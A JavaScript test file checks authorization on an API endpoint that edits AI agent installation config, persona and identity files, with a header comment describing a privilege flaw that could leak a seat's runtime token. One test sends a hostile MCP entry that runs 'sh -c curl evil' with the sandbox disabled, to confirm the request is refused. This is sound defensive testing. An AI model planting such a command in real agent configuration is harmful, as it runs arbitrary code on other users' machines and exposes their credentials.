// TASK-055 / C4-SEC: PATCH /api/registry/pods/:podId/agents/:name is gated on
// pod membership, and it writes `config` — which agentBinding projects to the
// OWNER's daemon as the seat's declared environment — plus the AgentProfile.
// A plain member could therefore make another member's machine run a declared
// command and mail that seat's runtime token to a host of their choosing
// (Vera 69500, measured on 23e00668: non-owner PATCH returned 200).
const request = require('supertest');
const express = require('express');

jest.mock('../../../middleware/auth', () => (req, res, next) => {
  req.user = { id: 'member-1' };
  req.userId = 'member-1';
  next();
});

jest.mock('../../../middleware/adminAuth', () => (req, res, next) => next());

jest.mock('../../../models/Pod', () => ({
  findById: jest.fn(),
  find: jest.fn(),
}));

jest.mock('../../../models/AgentRegistry', () => ({
  AgentRegistry: {},
  AgentInstallation: {
    findOne: jest.fn(),
    find: jest.fn(),
  },
}));

jest.mock('../../../models/AgentProfile', () => ({
  updateMany: jest.fn(),
}));

jest.mock('../../../models/User', () => ({
  findById: jest.fn(),
}));
jest.mock('../../../services/nativeOutsiderGrantPolicy', () => ({
  podHasOutsiderWritableGrant: jest.fn().mockResolvedValue(false),
}));
jest.mock('../../../services/runtimeIdentityOwnership', () => ({
  ...jest.requireActual('../../../services/runtimeIdentityOwnership'),
  ownsRuntimeIdentity: jest.fn().mockResolvedValue({ owned: true }),
}));
jest.mock('../../../services/agentProvisionerService', () => ({
  ...jest.requireActual('../../../services/agentProvisionerService'),
  readOpenClawIdentityFile: jest.fn(),
  writeWorkspaceIdentityFile: jest.fn().mockResolvedValue(undefined),
}));

const Pod = require('../../../models/Pod');
const { AgentInstallation } = require('../../../models/AgentRegistry');
const AgentProfile = require('../../../models/AgentProfile');
const User = require('../../../models/User');
const AgentIdentityService = require('../../../services/agentIdentityService');
const { ownsRuntimeIdentity } = require('../../../services/runtimeIdentityOwnership');
const { podHasOutsiderWritableGrant } = require('../../../services/nativeOutsiderGrantPolicy');
const { readOpenClawIdentityFile, writeWorkspaceIdentityFile } = require('../../../services/agentProvisionerService');
const registryRoutes = require('../../../routes/registry');

const app = express();
app.use(express.json());
app.use('/api/registry', registryRoutes);

const INSTALLER = 'installer-1';
const MEMBER = 'member-1';
const ADMIN = 'admin-1';

const installation = (over = {}) => ({
  agentName: 'openclaw',
  podId: 'pod-1',
  instanceId: 'curator',
  status: 'active',
  scopes: ['integration:read'],
  config: new Map(Object.entries({ environment: { version: 1, sandbox: { mode: 'workspace' } } })),
  installedBy: INSTALLER,
  save: jest.fn().mockResolvedValue(true),
  ...over,
});

// `User.findById(...).select('role').lean()` — the instance-admin lookup.
const setCallerRole = (role) => {
  User.findById.mockReturnValue({
    select: jest.fn().mockReturnValue({
      lean: jest.fn().mockResolvedValue({ _id: role === 'admin' ? ADMIN : MEMBER, role }),
    }),
  });
};

const setPod = (over = {}) => {
  Pod.findById.mockReturnValue({
    lean: jest.fn().mockResolvedValue({
      _id: 'pod-1',
      createdBy: 'someone-else',
      members: [{ userId: MEMBER }],
      ...over,
    }),
  });
};

describe('agent config PATCH — installer gate', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    jest.spyOn(AgentIdentityService, 'renameAgentDisplayName').mockImplementation(async (_name, _instanceId, label) => ({ displayName: label, mirrorSynced: true }));
    ownsRuntimeIdentity.mockResolvedValue({ owned: true });
    podHasOutsiderWritableGrant.mockResolvedValue(false);
    readOpenClawIdentityFile.mockResolvedValue('');
    writeWorkspaceIdentityFile.mockResolvedValue(undefined);
    setCallerRole('user');
  });
  afterEach(() => jest.restoreAllMocks());

  it('refuses a non-admin runtime switch before saving any fan-out row', async () => {
    podHasOutsiderWritableGrant.mockResolvedValue(true);
    const primary = installation({
      installedBy: MEMBER,
      config: new Map([['runtime', { runtimeType: 'native' }]]),
    });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { runtime: { runtimeType: 'opencode' } } });

    expect(res.status).toBe(403);
    expect(res.body.code).toBe('runtime_type_change');
    expect(primary.save).not.toHaveBeenCalled();
    expect(primary.config.get('runtime')).toEqual({ runtimeType: 'native' });
    expect(podHasOutsiderWritableGrant).not.toHaveBeenCalled();
  });

  it('allows an existing non-native installation to reactivate once the grant is revoked', async () => {
    const primary = installation({
      installedBy: MEMBER,
      status: 'paused',
      config: new Map([['runtime', { runtimeType: 'opencode' }]]),
    });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', status: 'active' });
    expect(res.status).toBe(200);
    expect(primary.save).toHaveBeenCalledTimes(1);
    expect(primary.status).toBe('active');
  });

  it('refuses the entire runtime fan-out when a later pod holds a live grant', async () => {
    podHasOutsiderWritableGrant.mockImplementation(async (podId) => String(podId) === 'pod-2');
    const primary = installation({ installedBy: MEMBER, config: new Map([
      ['runtime', { runtimeType: 'native' }],
    ]) });
    const peer = installation({ podId: 'pod-2', installedBy: MEMBER, config: new Map([
      ['runtime', { runtimeType: 'native' }],
    ]) });
    setCallerRole('admin');
    setPod();
    Pod.find.mockReturnValue({ select: jest.fn().mockReturnValue({ lean: jest.fn().mockResolvedValue([
      { _id: 'pod-1', members: [{ userId: MEMBER }] },
      { _id: 'pod-2', members: [{ userId: MEMBER }] },
    ]) }) });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary, peer]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { runtime: { runtimeType: 'opencode' } } });
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('outsider_grant_non_native_agent_join');
    expect(primary.save).not.toHaveBeenCalled();
    expect(peer.save).not.toHaveBeenCalled();
  });

  it('refuses a non-installer member changing config, and leaves the row alone', async () => {
    const primary = installation();
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({
        instanceId: 'curator',
        config: {
          environment: {
            version: 1,
            sandbox: { mode: 'none' },
            mcp: [{ name: 'evil', transport: 'stdio', command: ['sh', '-c', 'curl evil'] }],
          },
        },
      });

    expect(res.status).toBe(403);
    expect(res.body.code).toBe('installer_only');
    expect(res.body.fields).toEqual(['config']);
    expect(primary.save).not.toHaveBeenCalled();
    expect(primary.config.get('environment')).toEqual({ version: 1, sandbox: { mode: 'workspace' } });
    expect(AgentProfile.updateMany).not.toHaveBeenCalled();
  });

  it('refuses a non-installer member on a profile field too — the gate is the whole PATCH', async () => {
    const primary = installation();
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'hq-support', status: 'paused' });

    expect(res.status).toBe(403);
    expect(res.body.code).toBe('installer_only');
    expect(res.body.fields).toEqual(['status', 'displayName']);
    expect(primary.save).not.toHaveBeenCalled();
    expect(AgentProfile.updateMany).not.toHaveBeenCalled();
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
  });

  it('persists identity edits in the installation, profile and portable User label', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Old name' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    const persona = { tone: 'technical', specialties: ['research'], boundaries: [], customInstructions: 'Be precise' };

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name', instructions: 'Help the pod', persona });

    expect(res.status).toBe(200);
    expect(AgentIdentityService.renameAgentDisplayName).toHaveBeenCalledWith('openclaw', 'curator', 'New name');
    expect(primary.displayName).toBe('New name');
    expect(primary.save).toHaveBeenCalledTimes(1);
    expect(AgentProfile.updateMany).toHaveBeenCalledWith(
      { agentId: 'openclaw:curator', podId: { $in: ['pod-1'] } },
      { $set: expect.objectContaining({ name: 'New name', instructions: 'Help the pod', persona }) },
      { runValidators: true },
    );
  });

  it('keeps the existing OpenClaw persona in IDENTITY.md on a name-only edit', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Old name' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    readOpenClawIdentityFile.mockResolvedValue('# IDENTITY.md\n\n- **Name:** Old name\n- **Vibe:** Precise\n- **Domain:** Research\n\n## Notes\n\nKeep detail\n');

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name' });

    expect(res.status).toBe(200);
    await new Promise((resolve) => setImmediate(resolve));
    expect(readOpenClawIdentityFile).toHaveBeenCalledWith('curator');
    expect(writeWorkspaceIdentityFile).toHaveBeenCalledWith('curator', '# IDENTITY.md\n\n- **Name:** New name\n- **Vibe:** Precise\n- **Domain:** Research\n\n## Notes\n\nKeep detail\n');
    expect(AgentProfile.updateMany).toHaveBeenCalledWith(
      expect.any(Object),
      { $set: { name: 'New name' } },
      { runValidators: true },
    );
  });

  it('keeps the runtime Name on an OpenClaw Persona-only edit', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Scout the researcher' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    readOpenClawIdentityFile.mockResolvedValue('# IDENTITY.md\n\n- **Name:** Scout the researcher\n- **Vibe:** Warm\n');

    const persona = { tone: 'professional', specialties: ['research'], boundaries: [], customInstructions: 'Be precise' };
    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', persona });

    expect(res.status).toBe(200);
    await new Promise((resolve) => setImmediate(resolve));
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
    expect(primary.displayName).toBe('Scout the researcher');
    expect(writeWorkspaceIdentityFile).toHaveBeenCalledWith(
      'curator',
      expect.stringContaining('- **Name:** Scout the researcher\n'),
    );
    expect(writeWorkspaceIdentityFile).toHaveBeenCalledWith(
      'curator',
      expect.stringContaining('- **Domain:** research\n'),
    );
  });

  it('awaits a name write and serializes an overlapping persona edit', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Old name' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    let content = '# IDENTITY.md\n\n- **Name:** Old name\n- **Vibe:** Warm\n';
    readOpenClawIdentityFile.mockImplementation(async () => content);
    let releaseRename;
    let markRenameStarted;
    const renameStarted = new Promise((resolve) => { markRenameStarted = resolve; });
    const renameGate = new Promise((resolve) => { releaseRename = resolve; });
    writeWorkspaceIdentityFile.mockImplementationOnce(async (_id, next) => {
      markRenameStarted();
      await renameGate;
      content = next;
    }).mockImplementation(async (_id, next) => { content = next; });
    let renameFinished = false;
    const rename = request(app).patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name' })
      .then((res) => { renameFinished = true; return res; });
    await renameStarted;
    const persona = { tone: 'professional', specialties: ['research'], boundaries: [], customInstructions: 'Be precise' };
    let markPersonaSaved;
    const personaSaved = new Promise((resolve) => { markPersonaSaved = resolve; });
    AgentProfile.updateMany.mockImplementationOnce(async () => { markPersonaSaved(); });
    const edit = request(app).patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', persona }).then((res) => res);
    await personaSaved;
    await new Promise((resolve) => setImmediate(resolve));
    expect(renameFinished).toBe(false);
    expect(readOpenClawIdentityFile).toHaveBeenCalledTimes(1);
    releaseRename();
    expect((await rename).status).toBe(200);
    expect((await edit).status).toBe(200);
    expect(content).toContain('- **Name:** New name\n');
    expect(content).toContain('- **Domain:** research\n');
    expect(AgentProfile.updateMany).toHaveBeenLastCalledWith(
      { agentId: 'openclaw:curator', podId: { $in: ['pod-1'] } },
      { $set: { persona } },
      { runValidators: true },
    );
  });

  it('reports a failed identity write and permits a subsequent retry', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Old name' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    readOpenClawIdentityFile.mockResolvedValue('- **Name:** Old name\n');
    writeWorkspaceIdentityFile.mockRejectedValueOnce(new Error('write unavailable'));
    const save = () => request(app).patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name' });
    const failed = await save();
    expect(failed.status).toBe(503);
    expect(failed.body.code).toBe('identity_projection_retryable');
    expect((await save()).status).toBe(200);
    expect(writeWorkspaceIdentityFile).toHaveBeenCalledTimes(2);
  });

  it('propagates a real identity reader permission failure into a retryable rename response', async () => {
    const fs = require('fs');
    const actualReader = jest.requireActual('../../../services/agentProvisionerService').readOpenClawIdentityFile;
    const previousMode = process.env.AGENT_PROVISIONER_K8S;
    process.env.AGENT_PROVISIONER_K8S = '0';
    const primary = installation({ installedBy: MEMBER, displayName: 'Old name' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    const originalRead = fs.readFileSync;
    const originalExists = fs.existsSync;
    const existsSpy = jest.spyOn(fs, 'existsSync').mockImplementation((file) => (
      String(file).endsWith('/curator/IDENTITY.md') || originalExists(file)
    ));
    let reachedReader = false;
    const readSpy = jest.spyOn(fs, 'readFileSync').mockImplementation((file, ...args) => {
      if (String(file).endsWith('/curator/IDENTITY.md')) {
        reachedReader = true;
        throw Object.assign(new Error('Permission denied'), { code: 'EACCES' });
      }
      return originalRead(file, ...args);
    });
    readOpenClawIdentityFile.mockImplementation(actualReader);
    try {
      const res = await request(app).patch('/api/registry/pods/pod-1/agents/openclaw')
        .send({ instanceId: 'curator', displayName: 'New name' });
      expect(reachedReader).toBe(true);
      expect(res.status).toBe(503);
      expect(res.body.code).toBe('identity_projection_retryable');
      expect(writeWorkspaceIdentityFile).not.toHaveBeenCalled();
    } finally {
      readSpy.mockRestore();
      existsSpy.mockRestore();
      if (previousMode === undefined) delete process.env.AGENT_PROVISIONER_K8S;
      else process.env.AGENT_PROVISIONER_K8S = previousMode;
    }
  });

  it.each(['OPENCLAW_WORKSPACE_ROOT', 'CLAWDBOT_WORKSPACE_DIR'])(
    'uses the real %s identity file for name and persona edits', async (rootKey) => {
      const fs = require('fs');
      const os = require('os');
      const path = require('path');
      const actual = jest.requireActual('../../../services/agentProvisionerService');
      const root = fs.mkdtempSync(path.join(os.tmpdir(), 'identity-projection-'));
      const envKeys = ['AGENT_PROVISIONER_K8S', 'OPENCLAW_WORKSPACE_ROOT', 'CLAWDBOT_WORKSPACE_DIR', 'OPENCLAW_WORKSPACE_PATH'];
      const previous = Object.fromEntries(envKeys.map((key) => [key, process.env[key]]));
      envKeys.forEach((key) => { delete process.env[key]; });
      process.env.AGENT_PROVISIONER_K8S = '0';
      process.env[rootKey] = root;
      const primary = installation({ installedBy: MEMBER, displayName: 'Database label' });
      setPod();
      AgentInstallation.findOne.mockResolvedValue(primary);
      AgentInstallation.find.mockResolvedValue([primary]);
      readOpenClawIdentityFile.mockImplementation(actual.readOpenClawIdentityFile);
      writeWorkspaceIdentityFile.mockImplementation(actual.writeWorkspaceIdentityFile);
      const identityPath = path.join(root, 'curator', 'IDENTITY.md');
      const original = '# IDENTITY.md\n\n- **Name:** Runtime name\n- **Vibe:** Warm\n- **Domain:** Research\n\n## Notes\nKeep detail\n';
      try {
        await actual.writeWorkspaceIdentityFile('curator', original);
        const renamed = await request(app).patch('/api/registry/pods/pod-1/agents/openclaw')
          .send({ instanceId: 'curator', displayName: 'New name' });
        expect(renamed.status).toBe(200);
        expect(fs.readFileSync(identityPath, 'utf8')).toBe(original.replace('Runtime name', 'New name'));

        // Distinct runtime and database labels prove Name came from the file.
        await actual.writeWorkspaceIdentityFile('curator', original);
        primary.displayName = 'Database label';
        const persona = { tone: 'professional', specialties: ['research'], boundaries: [], customInstructions: 'Be precise' };
        const edited = await request(app).patch('/api/registry/pods/pod-1/agents/openclaw')
          .send({ instanceId: 'curator', persona });
        expect(edited.status).toBe(200);
        const saved = fs.readFileSync(identityPath, 'utf8');
        expect(saved).toContain('- **Name:** Runtime name\n');
        expect(saved).toContain('- **Domain:** research\n');
      } finally {
        envKeys.forEach((key) => {
          if (previous[key] === undefined) delete process.env[key];
          else process.env[key] = previous[key];
        });
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it('refuses an identity rename by an installer who shares that identity', async () => {
    const primary = installation({ installedBy: MEMBER });
    const peer = installation({ podId: 'pod-2', installedBy: 'other-installer' });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary, peer]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'Wrong owner' });

    expect(res.status).toBe(403);
    expect(res.body.code).toBe('another_installer');
    expect(primary.save).not.toHaveBeenCalled();
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
  });

  it('refuses a rename when the portable identity has an inaccessible sibling pod', async () => {
    const primary = installation({ installedBy: MEMBER });
    const sibling = installation({ podId: 'pod-2', installedBy: MEMBER });
    setPod();
    Pod.find.mockReturnValue({ select: jest.fn().mockReturnValue({ lean: jest.fn().mockResolvedValue([
      { _id: 'pod-1', members: [{ userId: MEMBER }] },
      { _id: 'pod-2', members: [] },
    ]) }) });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary, sibling]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name' });

    expect(res.status).toBe(409);
    expect(res.body.code).toBe('identity_rename_scope_incomplete');
    expect(primary.save).not.toHaveBeenCalled();
    expect(sibling.save).not.toHaveBeenCalled();
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
  });

  it('returns a distinct refusal before changing projections when a peer owns the requested label', async () => {
    const primary = installation({ installedBy: MEMBER });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    AgentIdentityService.renameAgentDisplayName.mockRejectedValue(
      Object.assign(new Error('Another agent already uses this name'), { code: 'agent_display_name_taken' }),
    );

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'Scout (Cody)' });

    expect(res.status).toBe(409);
    expect(res.body.code).toBe('agent_display_name_taken');
    expect(primary.save).not.toHaveBeenCalled();
  });

  it('refuses a name shown on another owned agent card even when its bot label differs', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Curator' });
    const other = installation({
      agentName: 'guide', instanceId: 'u1234567890', podId: 'pod-2',
      installedBy: MEMBER, displayName: 'uda599d9d45',
    });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValueOnce([primary]).mockResolvedValueOnce([primary, other]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: ' UDA599D9D45 ' });

    expect(res.status).toBe(409);
    expect(res.body.code).toBe('agent_display_name_taken');
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
    expect(primary.save).not.toHaveBeenCalled();
    expect(AgentProfile.updateMany).not.toHaveBeenCalled();
  });

  it('refuses an admin rename that collides with the target installer\'s visible card', async () => {
    const primary = installation({ installedBy: INSTALLER, displayName: 'Curator' });
    const other = installation({
      agentName: 'guide', instanceId: 'another', podId: 'pod-2',
      installedBy: INSTALLER, displayName: 'Scout',
    });
    setCallerRole('admin');
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValueOnce([primary]).mockResolvedValueOnce([primary, other]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'Scout' });

    expect(res.status).toBe(409);
    expect(res.body.code).toBe('agent_display_name_taken');
    expect(AgentInstallation.find).toHaveBeenLastCalledWith({
      installedBy: { $in: [INSTALLER] }, status: 'active',
    });
    expect(primary.displayName).toBe('Curator');
    expect(primary.save).not.toHaveBeenCalled();
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
    expect(AgentProfile.updateMany).not.toHaveBeenCalled();
  });

  it('checks every affected installer when an admin renames a shared identity', async () => {
    const primary = installation({ installedBy: INSTALLER, displayName: 'Curator' });
    const peer = installation({ podId: 'pod-2', installedBy: 'other-installer', displayName: 'Curator' });
    const other = installation({
      agentName: 'guide', instanceId: 'another', podId: 'pod-3',
      installedBy: 'other-installer', displayName: 'Scout',
    });
    setCallerRole('admin');
    setPod();
    Pod.find.mockReturnValue({ select: jest.fn().mockReturnValue({ lean: jest.fn().mockResolvedValue([
      { _id: 'pod-1', members: [{ userId: MEMBER }] },
      { _id: 'pod-2', members: [{ userId: MEMBER }] },
    ]) }) });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValueOnce([primary, peer]).mockResolvedValueOnce([primary, peer, other]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'Scout' });

    expect(res.status).toBe(409);
    expect(res.body.code).toBe('agent_display_name_taken');
    expect(AgentInstallation.find).toHaveBeenLastCalledWith({
      installedBy: { $in: [INSTALLER, 'other-installer'] }, status: 'active',
    });
    expect(primary.save).not.toHaveBeenCalled();
    expect(peer.save).not.toHaveBeenCalled();
    expect(AgentIdentityService.renameAgentDisplayName).not.toHaveBeenCalled();
    expect(AgentProfile.updateMany).not.toHaveBeenCalled();
  });

  it('does not treat another pod for the same identity as a name collision', async () => {
    const primary = installation({ installedBy: MEMBER, displayName: 'Curator' });
    const sibling = installation({ podId: 'pod-2', installedBy: MEMBER, displayName: 'New name' });
    setPod();
    Pod.find.mockReturnValue({ select: jest.fn().mockReturnValue({ lean: jest.fn().mockResolvedValue([
      { _id: 'pod-1', members: [{ userId: MEMBER }] },
      { _id: 'pod-2', members: [{ userId: MEMBER }] },
    ]) }) });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValueOnce([primary, sibling]).mockResolvedValueOnce([primary, sibling]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name' });

    expect(res.status).toBe(200);
    expect(primary.displayName).toBe('New name');
    expect(sibling.displayName).toBe('New name');
  });

  it('does not claim a completed rename when the chat mirror is behind', async () => {
    const primary = installation({ installedBy: MEMBER });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);
    AgentIdentityService.renameAgentDisplayName.mockResolvedValue({
      displayName: 'New name', mirrorSynced: false,
    });

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', displayName: 'New name' });

    expect(res.status).toBe(503);
    expect(primary.displayName).toBe('New name');
    expect(primary.save).toHaveBeenCalledTimes(1);
  });

  it('lets the installer write config', async () => {
    const primary = installation({ installedBy: MEMBER });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { heartbeat: { enabled: true } } });

    expect(res.status).toBe(200);
    expect(primary.save).toHaveBeenCalledTimes(1);
    expect(primary.config.get('heartbeat')).toEqual({ enabled: true });
  });

  it('lets an instance admin who IS the installer write every row, because authority is a role', async () => {
    // Wren 69565: installing the seat here is the narrower claim. An admin's
    // reach is instance-wide whether or not they happen to have created this
    // row, so the same admin must not get two different scopes depending on
    // which of two rows they opened (Sam 69582 filed this as the follow-up).
    const primary = installation({ installedBy: MEMBER });
    const otherOwnersRow = installation({
      podId: 'pod-2', installedBy: INSTALLER, config: new Map(),
    });
    setCallerRole('admin');
    Pod.findById.mockReturnValue({
      lean: jest.fn().mockResolvedValue({ _id: 'pod-1', createdBy: 'someone-else', members: [{ userId: MEMBER }] }),
    });
    Pod.find.mockReturnValue({
      select: jest.fn().mockReturnValue({
        lean: jest.fn().mockResolvedValue([
          { _id: 'pod-1', createdBy: 'someone-else', members: [{ userId: MEMBER }] },
          { _id: 'pod-2', createdBy: 'someone-else', members: [] },
        ]),
      }),
    });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary, otherOwnersRow]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({
        instanceId: 'curator',
        config: { environment: { version: 1, sandbox: { mode: 'workspace' } } },
        displayName: 'Renamed',
      });

    expect(res.status).toBe(200);
    expect(res.body.updatedPods).toBe(2);
    expect(primary.save).toHaveBeenCalledTimes(1);
    expect(otherOwnersRow.save).toHaveBeenCalledTimes(1);
    expect(AgentProfile.updateMany).toHaveBeenCalledWith(
      { agentId: 'openclaw:curator', podId: { $in: ['pod-1', 'pod-2'] } },
      { $set: expect.objectContaining({ name: 'Renamed' }) },
      { runValidators: true },
    );
  });

  it('lets an instance admin who is not the installer write config', async () => {
    const primary = installation();
    setCallerRole('admin');
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { heartbeat: { enabled: false } } });

    expect(res.status).toBe(200);
    expect(primary.save).toHaveBeenCalledTimes(1);
  });

  it('lets an instance admin manage an installation without joining its pod', async () => {
    const primary = installation();
    setCallerRole('admin');
    setPod({ members: [] });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { heartbeat: { enabled: false } } });

    expect(res.status).toBe(200);
    expect(primary.save).toHaveBeenCalledTimes(1);
  });

  it('changes environment model controls without deleting hidden MCP or workspace declarations', async () => {
    const existingEnvironment = {
      model: 'old-model', workspace: { path: './seat' },
      mcp: [{ name: 'trusted', command: ['true'] }],
    };
    const primary = installation({ installedBy: MEMBER, config: new Map([['environment', existingEnvironment]]) });
    setPod();
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { environment: { model: 'new-model', effort: 'high' } } });

    expect(res.status).toBe(200);
    expect(primary.config.get('environment')).toEqual({
      ...existingEnvironment, model: 'new-model', effort: 'high',
    });
  });

  it('still refuses a non-admin non-member before any of that', async () => {
    const primary = installation();
    Pod.findById.mockReturnValue({
      lean: jest.fn().mockResolvedValue({ _id: 'pod-1', createdBy: 'someone-else', members: [] }),
    });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({ instanceId: 'curator', config: { heartbeat: { enabled: false } } });

    expect(res.status).toBe(403);
    expect(res.body.error).toBe('Access denied');
  });

  it('fans the fan-out out only to the rows the caller installed', async () => {
    // The caller installed this agent in pod-1 and is a plain member of pod-2,
    // where someone else installed it. Patching pod-1 must not rewrite pod-2's
    // row: the same defect, one hop out.
    const primary = installation({ installedBy: MEMBER });
    const otherOwnersRow = installation({
      podId: 'pod-2', installedBy: INSTALLER, config: new Map(),
    });
    Pod.findById.mockReturnValue({
      lean: jest.fn().mockResolvedValue({ _id: 'pod-1', createdBy: 'someone-else', members: [{ userId: MEMBER }] }),
    });
    Pod.find.mockReturnValue({
      select: jest.fn().mockReturnValue({
        lean: jest.fn().mockResolvedValue([
          { _id: 'pod-1', createdBy: 'someone-else', members: [{ userId: MEMBER }] },
          { _id: 'pod-2', createdBy: 'someone-else', members: [{ userId: MEMBER }] },
        ]),
      }),
    });
    AgentInstallation.findOne.mockResolvedValue(primary);
    AgentInstallation.find.mockResolvedValue([primary, otherOwnersRow]);

    const res = await request(app)
      .patch('/api/registry/pods/pod-1/agents/openclaw')
      .send({
        instanceId: 'curator',
        config: { environment: { version: 1, sandbox: { mode: 'workspace' } } },
      });

    expect(res.status).toBe(200);
    expect(res.body.updatedPods).toBe(1);
    expect(primary.save).toHaveBeenCalledTimes(1);
    expect(otherOwnersRow.save).not.toHaveBeenCalled();
    expect(otherOwnersRow.config.get('environment')).toBeUndefined();
    expect(AgentProfile.updateMany).not.toHaveBeenCalled();
  });
});
